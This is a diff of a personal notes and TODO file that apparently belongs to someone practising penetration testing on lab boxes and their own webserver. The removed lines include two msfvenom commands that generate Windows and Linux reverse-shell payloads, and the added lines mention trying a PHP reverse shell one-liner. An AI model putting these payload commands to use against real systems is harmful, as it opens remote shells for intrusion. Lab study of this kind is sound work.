@@ -8,13 +8,24 @@ TODO - execute script on shutdown
        script in /bin/clean_home
 TODO - for Python relevant stuff make a Notebook rather than a .md file (Python.md)
 TODO - Lucy: save current pixel configuration -> will need dedicated function to restore
-TODO - Upload PHP reverse shell onto (own) webserver, REQUIRES: docker container with apache & PHP
 TODO - declutter and extend Dockerfiles folder
 TODO - Evaluate Docker Setups and discard flask-redis
+TODO - Extract and add Tridactyl config
+TODO - detailed writedown of the first three Boxes: brainpan, fristileaks & HackInOS
+TODO - Hacking the Art of Exploitation: prepare booksrc as C reference
+TODO - Kelevra: create own AP if no netctl profile available
 
 
-## BSS section
-containing statically-allocated variables
+## PHP
+Content of GET & POST in dedicated variables
+Was not able to make PHP reverse shell oneliner work - nc stops but no sign of traffic in wireshark
+
+## Python 
+Awesome new JupyterLap extends old notebook
+Need to define some shortcuts to make it useful (already blacklistadd url)
+
+
+
 
 ## Evaluate WordPress
 https://github.com/sammanthp007/WordPress-Pentesting-Setup
@@ -31,15 +42,6 @@ https://github.com/jtpereyda/boofuzz.git # pip install boofuzz
 ## TRIDACTYL direct Download
 https://tridactyl.cmcaine.co.uk/betas/tridactyl-latest.xpi
 
-## Windows reverse shell
-msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=8080 EXITFUNC=thread \
--f raw -b "\x00\x09\x0d\x0a\x20\xff" -n 32 > warhead.txt
-## Linux reverse shell
-msfvenom -p linux/x64/shell_reverse_tcp \ # Specify the payload
-            LHOST=127.0.0.1             \ # Target host to connect
-            LPORT=4444                  \ # Target port
-         -b '\x00'                      \ # Bad characters
-         -f python                        # Format of the payload
 
 ### Mount qcow2 files
 modprobe nbd
